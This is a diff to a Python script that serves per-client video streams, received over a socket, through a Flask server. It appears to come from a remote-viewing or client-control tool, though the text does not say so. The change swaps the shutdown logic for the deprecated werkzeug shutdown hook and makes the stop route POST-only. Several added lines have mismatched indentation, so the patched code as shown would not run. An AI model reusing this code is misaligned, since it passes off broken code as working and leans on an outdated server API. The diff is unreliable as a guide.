@@ -7,6 +7,7 @@ import cv2
 import numpy as np
 import keyboard  # Import the keyboard library
 import signal
+import werkzeug
 
 init(autoreset=True)
 
@@ -53,33 +54,31 @@ def start_streaming(client_socket, mode, client_id):
     def index():
         return render_template_string(html_template)
 
-    def shutdown_server():
+    def stop_flask():
     func = request.environ.get('werkzeug.server.shutdown')
     if func is None:
-        os._exit(0)  # Nouzové vypnutí, pokud nelze použít shutdown
+        raise RuntimeError('Not running with the Werkzeug Server')
     func()
+
   
     @app.route(f'/video_feed_{client_id}')
     def video_feed():
         return Response(generate_frames(client_socket, client_id),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
 
-     @app.route(f'/stop_streaming_{client_id}')
-     def stop_streaming():
+     @app.route(f'/stop_streaming_{client_id}', methods=['POST'])
+    def stop_streaming_route():
         global streaming
-        shutdown_server()
         streaming = False
-        print(Fore.YELLOW + "[ * ] Stopping streaming...")
-        
-        # Stop the Flask server by terminating the current thread
-        os.kill(os.getpid(), signal.SIGINT)  # Gracefully shut down Flask server
+        stop_flask()
         return "Streaming stopped", 200
-      
-    print(Fore.BLUE + f"[ * ] Opening player at: http://0.0.0.0:5000")
+
+    print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
 
     # Run the Flask app in a separate thread to handle the streaming
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
+
 
 
 def generate_frames(client_socket, client_id):
